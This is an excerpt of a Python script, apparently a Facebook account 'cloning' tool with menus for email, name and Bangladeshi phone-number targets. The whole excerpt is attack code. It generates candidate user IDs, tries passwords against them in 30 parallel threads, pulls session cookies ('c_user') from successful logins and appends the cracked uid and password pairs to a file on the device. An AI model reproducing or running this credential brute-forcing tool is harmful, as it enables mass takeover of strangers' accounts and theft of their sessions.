...
os.system("xdg-open https://github.com/abrakib07 ")
logo = ("""
 █
 .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
...
def v1():
    ...
    print(' [🤝] example rakib : @gmail.com, @yahoo.com ')
    rakib = input(' [📧]  Input rakib  : ')
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(f"\033[1;97m [🔥]  Target rakib:\033[1;92m {rakib}")
        print(' \033[1;97m[🔥]  The process has been started')
        print(' [🔥]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+guru+rakib
...
def v2():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        tl = str(len(user))
        print(' [🔥]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m[♥]  Target rakib:\033[1;92m Facebook CLONING (name)")
        print(' \033[1;97m[♥]  The process has been started')
        print(' [♥]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+rakib+kodex+guru
...
def v3():
    ...
    rakib = ' FACEBOOK VIP CLONING (BD NUMBER) '
    limit = int(input('[?] ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(f"\033[1;33m[♥]  YOUR TERGET CRACK MENU:\033[1;92m {rakib}")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\n[COOKIE🎁] : {coki}")
                open('/sdcard/abrakib07/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
